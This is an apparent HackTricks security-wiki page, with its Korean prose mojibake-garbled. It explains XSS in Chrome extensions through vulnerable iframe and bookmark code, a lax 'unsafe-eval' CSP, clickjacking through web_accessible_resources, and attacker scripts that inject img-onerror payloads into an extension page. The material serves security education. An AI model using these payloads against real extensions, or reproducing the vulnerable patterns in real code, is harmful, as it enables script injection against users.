# BrowExt - XSS ì˜ˆì œ

{% hint style="success" %}
AWS í•´í‚¹ ë°°ìš°ê¸° ë° ì—°ìŠµí•˜ê¸°:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP í•´í‚¹ ë°°ìš°ê¸° ë° ì—°ìŠµí•˜ê¸°: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks ì§€ì›í•˜ê¸°</summary>

* [**êµ¬ë… ê³„íš**](https://github.com/sponsors/carlospolop) í™•ì¸í•˜ê¸°!
* **ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— ì°¸ì—¬í•˜ê±°ë‚˜ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**ë¥¼ íŒ”ë¡œìš°í•˜ì„¸ìš”.**
* **[**HackTricks**](https://github.com/carlospolop/hacktricks) ë° [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) ê¹ƒí—ˆë¸Œ ë¦¬í¬ì§€í† ë¦¬ì— PRì„ ì œì¶œí•˜ì—¬ í•´í‚¹ íŒì„ ê³µìœ í•˜ì„¸ìš”.**

</details>
{% endhint %}

## Iframeì„ í†µí•œ êµì°¨ ì‚¬ì´íŠ¸ ìŠ¤í¬ë¦½íŒ… (XSS)

ì´ ì„¤ì •ì—ì„œëŠ” **ì½˜í…ì¸  ìŠ¤í¬ë¦½íŠ¸**ê°€ Iframeì„ ì¸ìŠ¤í„´ìŠ¤í™”í•˜ê¸° ìœ„í•´ êµ¬í˜„ë˜ë©°, Iframeì˜ ì†ŒìŠ¤ë¡œ ì¿¼ë¦¬ ë§¤ê°œë³€ìˆ˜ê°€ í¬í•¨ëœ URLì„ ì‚¬ìš©í•©ë‹ˆë‹¤:
```javascript
chrome.storage.local.get("message", result => {
let constructedURL = chrome.runtime.getURL("message.html") +
"?content=" + encodeURIComponent(result.message) +
"&redirect=https://example.net/details";
frame.src = constructedURL;
});
```
ê³µê°œì ìœ¼ë¡œ ì ‘ê·¼ ê°€ëŠ¥í•œ HTML í˜ì´ì§€, **`message.html`**,ì€ URLì˜ ë§¤ê°œë³€ìˆ˜ì— ë”°ë¼ ë¬¸ì„œ ë³¸ë¬¸ì— ë™ì ìœ¼ë¡œ ì½˜í…ì¸ ë¥¼ ì¶”ê°€í•˜ë„ë¡ ì„¤ê³„ë˜ì—ˆìŠµë‹ˆë‹¤:
```javascript
$(document).ready(() => {
let urlParams = new URLSearchParams(window.location.search);
let userContent = urlParams.get("content");
$(document.body).html(`${userContent} <button id='detailBtn'>Details</button>`);
$('#detailBtn').on('click', () => {
let destinationURL = urlParams.get("redirect");
chrome.tabs.create({ url: destinationURL });
});
});
```
ì•…ì˜ì ì¸ ìŠ¤í¬ë¦½íŠ¸ê°€ ì ì˜ í˜ì´ì§€ì—ì„œ ì‹¤í–‰ë˜ì–´ Iframeì˜ ì†ŒìŠ¤ì˜ `content` ë§¤ê°œë³€ìˆ˜ë¥¼ ìˆ˜ì •í•˜ì—¬ **XSS í˜ì´ë¡œë“œ**ë¥¼ ë„ì…í•©ë‹ˆë‹¤. ì´ëŠ” Iframeì˜ ì†ŒìŠ¤ë¥¼ ì—…ë°ì´íŠ¸í•˜ì—¬ ìœ í•´í•œ ìŠ¤í¬ë¦½íŠ¸ë¥¼ í¬í•¨ì‹œí‚´ìœ¼ë¡œì¨ ë‹¬ì„±ë©ë‹ˆë‹¤:
```javascript
setTimeout(() => {
let targetFrame = document.querySelector("iframe").src;
let baseURL = targetFrame.split('?')[0];
let xssPayload = "<img src='invalid' onerror='alert(\"XSS\")'>";
let maliciousURL = `${baseURL}?content=${encodeURIComponent(xssPayload)}`;

document.querySelector("iframe").src = maliciousURL;
}, 1000);
```
ê³¼ë„í•˜ê²Œ í—ˆìš©ì ì¸ ì½˜í…ì¸  ë³´ì•ˆ ì •ì±… ì˜ˆ:
```json
"content_security_policy": "script-src 'self' 'unsafe-eval'; object-src 'self';"
```
JavaScriptì˜ ì‹¤í–‰ì„ í—ˆìš©í•˜ì—¬ ì‹œìŠ¤í…œì„ XSS ê³µê²©ì— ì·¨ì•½í•˜ê²Œ ë§Œë“­ë‹ˆë‹¤.

XSSë¥¼ ìœ ë°œí•˜ëŠ” ëŒ€ì•ˆì ì¸ ì ‘ê·¼ ë°©ì‹ì€ Iframe ìš”ì†Œë¥¼ ìƒì„±í•˜ê³  ê·¸ ì†ŒìŠ¤ë¥¼ `content` ë§¤ê°œë³€ìˆ˜ë¡œ ìœ í•´í•œ ìŠ¤í¬ë¦½íŠ¸ë¥¼ í¬í•¨í•˜ë„ë¡ ì„¤ì •í•˜ëŠ” ê²ƒì…ë‹ˆë‹¤:
```javascript
let newFrame = document.createElement("iframe");
newFrame.src = "chrome-extension://abcdefghijklmnopabcdefghijklmnop/message.html?content=" +
encodeURIComponent("<img src='x' onerror='alert(\"XSS\")'>");
document.body.append(newFrame);
```
## DOM-based XSS + ClickJacking

ì´ ì˜ˆì‹œëŠ” [ì›ë³¸ ê²Œì‹œë¬¼ ì‘ì„±](https://thehackerblog.com/steam-fire-and-paste-a-story-of-uxss-via-dom-xss-clickjacking-in-steam-inventory-helper/)ì—ì„œ ê°€ì ¸ì™”ìŠµë‹ˆë‹¤.

í•µì‹¬ ë¬¸ì œëŠ” **`/html/bookmarks.html`**ì— ìœ„ì¹˜í•œ DOM ê¸°ë°˜ êµì°¨ ì‚¬ì´íŠ¸ ìŠ¤í¬ë¦½íŒ…(XSS) ì·¨ì•½ì ì—ì„œ ë°œìƒí•©ë‹ˆë‹¤. ë¬¸ì œì˜ JavaScriptëŠ” **`bookmarks.js`**ì˜ ì¼ë¶€ë¡œ ì•„ë˜ì— ìì„¸íˆ ì„¤ëª…ë˜ì–´ ìˆìŠµë‹ˆë‹¤:
```javascript
$('#btAdd').on('click', function() {
var bookmarkName = $('#txtName').val();
if ($('.custom-button .label').filter(function() {
return $(this).text() === bookmarkName;
}).length) return false;

var bookmarkItem = $('<div class="custom-button">');
bookmarkItem.html('<span class="label">' + bookmarkName + '</span>');
bookmarkItem.append('<button class="remove-btn" title="delete">x</button>');
bookmarkItem.attr('data-title', bookmarkName);
bookmarkItem.data('timestamp', (new Date().getTime()));
$('section.bookmark-container .existing-items').append(bookmarkItem);
persistData();
});
```
ì´ ì½”ë“œ ì¡°ê°ì€ **`txtName`** ì…ë ¥ í•„ë“œì—ì„œ **ê°’**ì„ ê°€ì ¸ì˜¤ê³  **ë¬¸ìì—´ ì—°ê²°ì„ ì‚¬ìš©í•˜ì—¬ HTMLì„ ìƒì„±**í•œ ë‹¤ìŒ, jQueryì˜ `.append()` í•¨ìˆ˜ë¥¼ ì‚¬ìš©í•˜ì—¬ DOMì— ì¶”ê°€í•©ë‹ˆë‹¤.

ì¼ë°˜ì ìœ¼ë¡œ Chrome í™•ì¥ì˜ ì½˜í…ì¸  ë³´ì•ˆ ì •ì±…(CSP)ì€ ì´ëŸ¬í•œ ì·¨ì•½ì ì„ ë°©ì§€í•©ë‹ˆë‹¤. ê·¸ëŸ¬ë‚˜ **â€˜unsafe-evalâ€™ë¡œ CSP ì™„í™”**ì™€ jQueryì˜ DOM ì¡°ì‘ ë©”ì„œë“œ ì‚¬ìš©(ì´ ë©”ì„œë“œëŠ” DOM ì‚½ì… ì‹œ [`eval()`](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/eval)ì— ìŠ¤í¬ë¦½íŠ¸ë¥¼ ì „ë‹¬í•˜ê¸° ìœ„í•´ [`globalEval()`](https://api.jquery.com/jquery.globaleval/)ì„ ì‚¬ìš©í•¨)ìœ¼ë¡œ ì¸í•´ ì—¬ì „íˆ ì•…ìš©ì´ ê°€ëŠ¥í•©ë‹ˆë‹¤.

ì´ ì·¨ì•½ì ì€ ì¤‘ìš”í•˜ì§€ë§Œ, ê·¸ ì•…ìš©ì€ ì¼ë°˜ì ìœ¼ë¡œ ì‚¬ìš©ì ìƒí˜¸ì‘ìš©ì— ì˜ì¡´í•©ë‹ˆë‹¤: í˜ì´ì§€ ë°©ë¬¸, XSS í˜ì´ë¡œë“œ ì…ë ¥, â€œì¶”ê°€â€ ë²„íŠ¼ í™œì„±í™”.

ì´ ì·¨ì•½ì ì„ ê°•í™”í•˜ê¸° ìœ„í•´, ë‘ ë²ˆì§¸ **í´ë¦­ì¬í‚¹** ì·¨ì•½ì ì´ ì•…ìš©ë©ë‹ˆë‹¤. Chrome í™•ì¥ì˜ ë§¤ë‹ˆí˜ìŠ¤íŠ¸ëŠ” ê´‘ë²”ìœ„í•œ `web_accessible_resources` ì •ì±…ì„ ë³´ì—¬ì¤ë‹ˆë‹¤:
```json
"web_accessible_resources": [
"html/bookmarks.html",
"dist/*",
"assets/*",
"font/*",
[...]
],
```
íŠ¹íˆ, **`/html/bookmarks.html`** í˜ì´ì§€ëŠ” í”„ë ˆì´ë°ì— ì·¨ì•½í•˜ì—¬ **clickjacking**ì— ë…¸ì¶œë©ë‹ˆë‹¤. ì´ ì·¨ì•½ì ì€ ê³µê²©ìì˜ ì‚¬ì´íŠ¸ ë‚´ì—ì„œ í˜ì´ì§€ë¥¼ í”„ë ˆì„ìœ¼ë¡œ ì„¤ì •í•˜ê³ , DOM ìš”ì†Œë¡œ ë®ì–´ì”Œì›Œ ì¸í„°í˜ì´ìŠ¤ë¥¼ ê¸°ë§Œì ìœ¼ë¡œ ì¬ì„¤ê³„í•˜ëŠ” ë° í™œìš©ë©ë‹ˆë‹¤. ì´ ì¡°ì‘ì€ í”¼í•´ìê°€ ê¸°ë³¸ í™•ì¥ê³¼ ì˜ë„ì¹˜ ì•Šê²Œ ìƒí˜¸ì‘ìš©í•˜ë„ë¡ ì´ë•ë‹ˆë‹¤.

## References

* [https://palant.info/2022/08/31/when-extension-pages-are-web-accessible/](https://palant.info/2022/08/31/when-extension-pages-are-web-accessible/)
* [https://thehackerblog.com/steam-fire-and-paste-a-story-of-uxss-via-dom-xss-clickjacking-in-steam-inventory-helper/](https://thehackerblog.com/steam-fire-and-paste-a-story-of-uxss-via-dom-xss-clickjacking-in-steam-inventory-helper/)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
